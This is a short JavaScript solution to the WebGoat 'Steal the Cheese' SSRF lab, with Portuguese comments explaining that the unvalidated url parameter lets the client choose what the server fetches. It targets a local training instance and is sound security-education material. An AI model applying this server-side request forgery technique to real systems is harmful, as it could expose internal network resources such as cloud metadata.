// WebGoat - Server-Side Request Forgery ("Steal the Cheese")
// OWASP: A10 - Server-Side Request Forgery (SSRF)
// CWE-918

// ---------------------------------------------------------------------------
// Requisicao original disparada pelo botao "Steal the Cheese":
// POST http://127.0.0.1:8080/WebGoat/SSRF/task1
// Content-Type: application/x-www-form-urlencoded
// Body original: url=images/tom.png
// ---------------------------------------------------------------------------

// Falha identificada: o parametro "url" enviado ao servidor nao e validado
// nem restrito a uma lista de recursos permitidos, permitindo ao cliente
// controlar qual recurso o servidor busca (Server-Side Request Forgery).

fetch("http://127.0.0.1:8080/WebGoat/SSRF/task1", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
  credentials: "include",
  body: "url=images/jerry.png"
}).then(r => r.json()).then(console.log).catch(console.error)

// Resultado esperado: lessonCompleted: true, feedback: "You rocked the SSRF!"
// O servidor buscou e retornou um recurso diferente do originalmente
// esperado, confirmando que o parametro controla a requisicao feita
// pelo proprio servidor (em um cenario real, poderia apontar para
// recursos internos da rede, como metadados de nuvem).
